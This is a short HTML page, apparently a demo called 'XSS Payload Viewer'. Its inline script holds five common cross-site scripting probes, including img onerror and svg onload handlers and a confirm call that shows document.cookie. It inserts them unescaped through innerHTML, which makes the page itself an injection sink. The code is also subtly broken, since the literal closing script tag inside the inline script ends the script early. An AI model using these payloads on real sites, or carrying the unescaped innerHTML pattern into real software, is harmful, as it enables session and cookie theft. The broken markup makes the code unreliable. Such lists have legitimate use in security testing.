<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Payload Viewer</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>XSS Payload List</h2>
    <ul id="list"></ul>
  </div>

  <script>
    const payloads = [
      `<script>alert(1)</script>`,
      `"><img src=x onerror=alert(1)>`,
      `<svg/onload=alert(1)>`,
      `"><svg onload=confirm(1)>`,
      `'"><script>confirm(document.cookie)</script>`
    ];
    document.getElementById("list").innerHTML = payloads.map(p => `<li>${p}</li>`).join("");
  </script>
</body>
</html>
